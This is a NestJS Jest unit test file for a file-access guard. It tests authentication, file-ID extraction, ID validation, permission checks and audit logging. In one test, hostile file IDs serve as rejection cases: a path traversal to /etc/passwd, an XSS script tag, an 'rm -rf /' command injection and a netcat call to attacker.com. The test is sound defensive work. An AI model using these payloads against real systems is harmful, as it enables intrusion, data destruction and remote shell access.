// src/presentation/guards/__tests__/file-access.guard.spec.ts

/**
 * Tests unitaires pour FileAccessGuard - VERSION CORRIGÉE
 *
 * Corrections apportées :
 * - Jest mocking properly typed
 * - Interface issues resolved
 * - Mock implementations fixed
 * - FileOperation enum values corrected to match actual enum (READ, WRITE, DELETE, SHARE)
 *
 * @author Backend Team
 * @version 1.4 - Fixed all FileOperation enum values
 * @since Phase 2.2 - Middleware Sécurité et Guards
 */

import { Test, TestingModule } from '@nestjs/testing';
import {
  ExecutionContext,
  UnauthorizedException,
  BadRequestException,
  ForbiddenException,
} from '@nestjs/common';
import { Reflector } from '@nestjs/core';
import { FileAccessGuard } from '../file-access.guard';
import { FileSecurityService } from '../../../domain/services/file-security.service';
import { FileOperation } from '../../../types/file-system.types';

/**
 * Interface pour étendre Request avec les informations utilisateur et sécurité
 */
interface TestAuthenticatedRequest {
  user?: {
    id: string;
    email?: string;
    roles?: string[];
    isAdmin?: boolean;
  };
  security?: {
    clientIp: string;
    threatLevel: 'low' | 'medium' | 'high';
    isVpn: boolean;
    isTor: boolean;
    country: string;
  };
  params?: Record<string, string>;
  query?: Record<string, any>;
  body?: Record<string, any>;
  headers?: Record<string, string | string[]>;
  method?: string;
  originalUrl?: string;
  path?: string;
  ip?: string;
  socket?: {
    remoteAddress?: string;
  };
}

/**
 * Mock pour ExecutionContext
 */
interface MockExecutionContext {
  switchToHttp: () => {
    getRequest: () => TestAuthenticatedRequest;
  };
  getHandler: () => { name: string };
}

describe('FileAccessGuard', () => {
  let guard: FileAccessGuard;
  let mockReflector: {
    get: jest.MockedFunction<any>;
  };
  let mockFileSecurityService: {
    checkFileAccess: jest.MockedFunction<any>;
  };
  let mockExecutionContext: MockExecutionContext;
  let mockRequest: TestAuthenticatedRequest;

  /**
   * Configuration initiale des tests
   */
  beforeEach(async () => {
    mockReflector = {
      get: jest.fn(),
    };

    mockFileSecurityService = {
      checkFileAccess: jest.fn(),
    };

    mockRequest = {
      params: {},
      query: {},
      body: {},
      headers: {
        'user-agent': 'Test Browser',
      },
      ip: '192.168.1.100',
      originalUrl: '/api/v1/files/test-file-123',
      method: 'GET',
      user: {
        id: 'user-123',
        email: 'test@coders.com',
        roles: ['user'],
        isAdmin: false,
      },
      security: {
        clientIp: '192.168.1.100',
        threatLevel: 'low',
        isVpn: false,
        isTor: false,
        country: 'FR',
      },
    };

    mockExecutionContext = {
      switchToHttp: () => ({
        getRequest: () => mockRequest,
      }),
      getHandler: jest.fn().mockReturnValue({
        name: 'getFile',
      }),
    };

    const module: TestingModule = await Test.createTestingModule({
      providers: [
        FileAccessGuard,
        {
          provide: Reflector,
          useValue: mockReflector,
        },
        {
          provide: FileSecurityService,
          useValue: mockFileSecurityService,
        },
      ],
    }).compile();

    guard = module.get<FileAccessGuard>(FileAccessGuard);
  });

  /**
   * Nettoyage après chaque test
   */
  afterEach(() => {
    jest.clearAllMocks();
  });

  describe('Authentication Validation', () => {
    /**
     * Test : Rejet des requêtes non authentifiées
     */
    it('should reject requests without authenticated user', async () => {
      mockRequest.user = undefined;

      await expect(
        guard.canActivate(mockExecutionContext as ExecutionContext),
      ).rejects.toThrow(UnauthorizedException);

      expect(mockFileSecurityService.checkFileAccess).not.toHaveBeenCalled();
    });

    /**
     * Test : Rejet des utilisateurs sans ID
     */
    it('should reject requests from users without valid ID', async () => {
      mockRequest.user = {
        id: '',
        email: 'test@coders.com',
        roles: ['user'],
        isAdmin: false,
      };

      await expect(
        guard.canActivate(mockExecutionContext as ExecutionContext),
      ).rejects.toThrow(UnauthorizedException);

      expect(mockFileSecurityService.checkFileAccess).not.toHaveBeenCalled();
    });
  });

  describe('File Operation Requirements', () => {
    /**
     * Test : Autorisation sans opération requise
     */
    it('should allow access when no file operation is required', async () => {
      mockReflector.get.mockReturnValue(undefined);

      const result = await guard.canActivate(
        mockExecutionContext as ExecutionContext,
      );

      expect(result).toBe(true);
      expect(mockFileSecurityService.checkFileAccess).not.toHaveBeenCalled();
    });

    /**
     * Test : Validation avec opération READ requise
     */
    it('should validate file access for READ operation', async () => {
      mockRequest.params = { fileId: 'file-123' };
      mockReflector.get.mockReturnValue(FileOperation.READ);
      mockFileSecurityService.checkFileAccess.mockResolvedValue(true);

      const result = await guard.canActivate(
        mockExecutionContext as ExecutionContext,
      );

      expect(result).toBe(true);
      expect(mockFileSecurityService.checkFileAccess).toHaveBeenCalledWith(
        'file-123',
        'user-123',
        FileOperation.READ,
      );
    });

    /**
     * Test : Validation avec opération WRITE requise
     */
    it('should validate file access for WRITE operation', async () => {
      mockRequest.params = { fileId: 'file-456' };
      mockReflector.get.mockReturnValue(FileOperation.WRITE);
      mockFileSecurityService.checkFileAccess.mockResolvedValue(true);

      const result = await guard.canActivate(
        mockExecutionContext as ExecutionContext,
      );

      expect(result).toBe(true);
      expect(mockFileSecurityService.checkFileAccess).toHaveBeenCalledWith(
        'file-456',
        'user-123',
        FileOperation.WRITE,
      );
    });

    /**
     * Test : Validation avec opération DELETE requise
     */
    it('should validate file access for DELETE operation', async () => {
      mockRequest.params = { fileId: 'file-789' };
      mockReflector.get.mockReturnValue(FileOperation.DELETE);
      mockFileSecurityService.checkFileAccess.mockResolvedValue(true);

      const result = await guard.canActivate(
        mockExecutionContext as ExecutionContext,
      );

      expect(result).toBe(true);
      expect(mockFileSecurityService.checkFileAccess).toHaveBeenCalledWith(
        'file-789',
        'user-123',
        FileOperation.DELETE,
      );
    });

    /**
     * Test : Validation avec opération SHARE requise
     */
    it('should validate file access for SHARE operation', async () => {
      mockRequest.params = { fileId: 'file-share-123' };
      mockReflector.get.mockReturnValue(FileOperation.SHARE);
      mockFileSecurityService.checkFileAccess.mockResolvedValue(true);

      const result = await guard.canActivate(
        mockExecutionContext as ExecutionContext,
      );

      expect(result).toBe(true);
      expect(mockFileSecurityService.checkFileAccess).toHaveBeenCalledWith(
        'file-share-123',
        'user-123',
        FileOperation.SHARE,
      );
    });
  });

  describe('File ID Extraction', () => {
    /**
     * Test : Extraction fileId depuis paramètres de route
     */
    it('should extract fileId from route parameters', async () => {
      mockRequest.params = { fileId: 'extracted-file-123' };
      mockReflector.get.mockReturnValue(FileOperation.READ);
      mockFileSecurityService.checkFileAccess.mockResolvedValue(true);

      const result = await guard.canActivate(
        mockExecutionContext as ExecutionContext,
      );

      expect(result).toBe(true);
      expect(mockFileSecurityService.checkFileAccess).toHaveBeenCalledWith(
        'extracted-file-123',
        'user-123',
        FileOperation.READ,
      );
    });

    /**
     * Test : Extraction ID générique depuis paramètres
     */
    it('should extract ID from generic id parameter', async () => {
      mockRequest.params = { id: 'generic-id-456' };
      mockReflector.get.mockReturnValue(FileOperation.READ);
      mockFileSecurityService.checkFileAccess.mockResolvedValue(true);

      const result = await guard.canActivate(
        mockExecutionContext as ExecutionContext,
      );

      expect(result).toBe(true);
      expect(mockFileSecurityService.checkFileAccess).toHaveBeenCalledWith(
        'generic-id-456',
        'user-123',
        FileOperation.READ,
      );
    });

    /**
     * Test : Extraction depuis query parameters
     */
    it('should extract fileId from query parameters as fallback', async () => {
      mockRequest.query = { fileId: 'query-file-789' };
      mockReflector.get.mockReturnValue(FileOperation.READ);
      mockFileSecurityService.checkFileAccess.mockResolvedValue(true);

      const result = await guard.canActivate(
        mockExecutionContext as ExecutionContext,
      );

      expect(result).toBe(true);
      expect(mockFileSecurityService.checkFileAccess).toHaveBeenCalledWith(
        'query-file-789',
        'user-123',
        FileOperation.READ,
      );
    });

    /**
     * Test : Extraction depuis le corps de la requête
     */
    it('should extract fileId from request body for POST/PUT requests', async () => {
      mockRequest.method = 'POST';
      mockRequest.body = { fileId: 'body-file-101' };
      mockReflector.get.mockReturnValue(FileOperation.WRITE);
      mockFileSecurityService.checkFileAccess.mockResolvedValue(true);

      const result = await guard.canActivate(
        mockExecutionContext as ExecutionContext,
      );

      expect(result).toBe(true);
      expect(mockFileSecurityService.checkFileAccess).toHaveBeenCalledWith(
        'body-file-101',
        'user-123',
        FileOperation.WRITE,
      );
    });

    /**
     * Test : Extraction depuis headers personnalisés
     */
    it('should extract fileId from custom headers', async () => {
      mockRequest.headers = {
        ...mockRequest.headers,
        'x-file-id': 'header-file-202',
      };
      mockReflector.get.mockReturnValue(FileOperation.READ);
      mockFileSecurityService.checkFileAccess.mockResolvedValue(true);

      const result = await guard.canActivate(
        mockExecutionContext as ExecutionContext,
      );

      expect(result).toBe(true);
      expect(mockFileSecurityService.checkFileAccess).toHaveBeenCalledWith(
        'header-file-202',
        'user-123',
        FileOperation.READ,
      );
    });

    /**
     * Test : Erreur si aucun fileId trouvé
     */
    it('should throw BadRequestException when no fileId is found', async () => {
      mockRequest.params = {};
      mockRequest.query = {};
      mockRequest.body = {};
      mockRequest.headers = { 'user-agent': 'Test Browser' };
      mockReflector.get.mockReturnValue(FileOperation.READ);

      await expect(
        guard.canActivate(mockExecutionContext as ExecutionContext),
      ).rejects.toThrow(BadRequestException);

      expect(mockFileSecurityService.checkFileAccess).not.toHaveBeenCalled();
    });
  });

  describe('File ID Validation', () => {
    /**
     * Test : Validation format UUID v4
     */
    it('should accept valid UUID v4 format file IDs', async () => {
      const validUuid = '123e4567-e89b-12d3-a456-426614174000';
      mockRequest.params = { fileId: validUuid };
      mockReflector.get.mockReturnValue(FileOperation.READ);
      mockFileSecurityService.checkFileAccess.mockResolvedValue(true);

      const result = await guard.canActivate(
        mockExecutionContext as ExecutionContext,
      );

      expect(result).toBe(true);
      expect(mockFileSecurityService.checkFileAccess).toHaveBeenCalledWith(
        validUuid,
        'user-123',
        FileOperation.READ,
      );
    });

    /**
     * Test : Validation format ID personnalisé préfixé
     */
    it('should accept custom prefixed file IDs', async () => {
      const customId = 'file-abc123def456';
      mockRequest.params = { fileId: customId };
      mockReflector.get.mockReturnValue(FileOperation.READ);
      mockFileSecurityService.checkFileAccess.mockResolvedValue(true);

      const result = await guard.canActivate(
        mockExecutionContext as ExecutionContext,
      );

      expect(result).toBe(true);
      expect(mockFileSecurityService.checkFileAccess).toHaveBeenCalledWith(
        customId,
        'user-123',
        FileOperation.READ,
      );
    });

    /**
     * Test : Validation IDs alphanumériques simples
     */
    it('should accept simple alphanumeric file IDs', async () => {
      const simpleId = 'abcd1234efgh5678';
      mockRequest.params = { fileId: simpleId };
      mockReflector.get.mockReturnValue(FileOperation.READ);
      mockFileSecurityService.checkFileAccess.mockResolvedValue(true);

      const result = await guard.canActivate(
        mockExecutionContext as ExecutionContext,
      );

      expect(result).toBe(true);
      expect(mockFileSecurityService.checkFileAccess).toHaveBeenCalledWith(
        simpleId,
        'user-123',
        FileOperation.READ,
      );
    });

    /**
     * Test : Rejet des IDs avec caractères interdits
     */
    it('should reject file IDs with dangerous characters', async () => {
      const dangerousIds = [
        '../../../etc/passwd',
        'file<script>alert(1)</script>',
        'file?cmd=rm -rf /',
        'file|nc attacker.com 4444',
      ];

      for (const dangerousId of dangerousIds) {
        mockRequest.params = { fileId: dangerousId };
        mockReflector.get.mockReturnValue(FileOperation.READ);

        await expect(
          guard.canActivate(mockExecutionContext as ExecutionContext),
        ).rejects.toThrow(BadRequestException);
      }

      expect(mockFileSecurityService.checkFileAccess).not.toHaveBeenCalled();
    });

    /**
     * Test : Rejet des IDs trop courts
     */
    it('should reject file IDs that are too short', async () => {
      const shortIds = ['', 'a', 'ab', 'abc123'];

      for (const shortId of shortIds) {
        mockRequest.params = { fileId: shortId };
        mockReflector.get.mockReturnValue(FileOperation.READ);

        await expect(
          guard.canActivate(mockExecutionContext as ExecutionContext),
        ).rejects.toThrow(BadRequestException);
      }

      expect(mockFileSecurityService.checkFileAccess).not.toHaveBeenCalled();
    });
  });

  describe('Access Control', () => {
    /**
     * Test : Autorisation d'accès valide
     */
    it('should allow access when user has valid permissions', async () => {
      mockRequest.params = { fileId: 'accessible-file-123' };
      mockReflector.get.mockReturnValue(FileOperation.READ);
      mockFileSecurityService.checkFileAccess.mockResolvedValue(true);

      const result = await guard.canActivate(
        mockExecutionContext as ExecutionContext,
      );

      expect(result).toBe(true);
      expect(mockFileSecurityService.checkFileAccess).toHaveBeenCalledWith(
        'accessible-file-123',
        'user-123',
        FileOperation.READ,
      );
    });

    /**
     * Test : Refus d'accès non autorisé
     */
    it('should deny access when user lacks permissions', async () => {
      mockRequest.params = { fileId: 'protected-file-456' };
      mockReflector.get.mockReturnValue(FileOperation.WRITE);
      mockFileSecurityService.checkFileAccess.mockResolvedValue(false);

      await expect(
        guard.canActivate(mockExecutionContext as ExecutionContext),
      ).rejects.toThrow(ForbiddenException);

      expect(mockFileSecurityService.checkFileAccess).toHaveBeenCalledWith(
        'protected-file-456',
        'user-123',
        FileOperation.WRITE,
      );
    });

    /**
     * Test : Gestion des erreurs de service de sécurité
     */
    it('should handle security service errors gracefully', async () => {
      mockRequest.params = { fileId: 'error-file-789' };
      mockReflector.get.mockReturnValue(FileOperation.READ);
      mockFileSecurityService.checkFileAccess.mockRejectedValue(
        new Error('Security service unavailable'),
      );

      await expect(
        guard.canActivate(mockExecutionContext as ExecutionContext),
      ).rejects.toThrow(ForbiddenException);

      expect(mockFileSecurityService.checkFileAccess).toHaveBeenCalledWith(
        'error-file-789',
        'user-123',
        FileOperation.READ,
      );
    });
  });

  describe('Audit and Logging', () => {
    /**
     * Test : Logging des accès autorisés
     */
    it('should log successful access attempts', async () => {
      const consoleLogSpy = jest.spyOn(console, 'log').mockImplementation();

      mockRequest.params = { fileId: 'logged-file-123' };
      mockReflector.get.mockReturnValue(FileOperation.READ);
      mockFileSecurityService.checkFileAccess.mockResolvedValue(true);

      const result = await guard.canActivate(
        mockExecutionContext as ExecutionContext,
      );

      expect(result).toBe(true);
      expect(consoleLogSpy).toHaveBeenCalledWith(
        expect.stringContaining('File access granted'),
      );

      consoleLogSpy.mockRestore();
    });

    /**
     * Test : Logging des tentatives d'accès refusées
     */
    it('should log failed access attempts with security context', async () => {
      const consoleWarnSpy = jest.spyOn(console, 'warn').mockImplementation();

      mockRequest.params = { fileId: 'denied-file-456' };
      mockReflector.get.mockReturnValue(FileOperation.DELETE);
      mockFileSecurityService.checkFileAccess.mockResolvedValue(false);

      await expect(
        guard.canActivate(mockExecutionContext as ExecutionContext),
      ).rejects.toThrow(ForbiddenException);

      expect(consoleWarnSpy).toHaveBeenCalledWith(
        expect.stringContaining('File access denied'),
        expect.objectContaining({
          userId: 'user-123',
          fileId: 'denied-file-456',
          operation: FileOperation.DELETE,
          ipAddress: '192.168.1.100',
        }),
      );

      consoleWarnSpy.mockRestore();
    });
  });
});
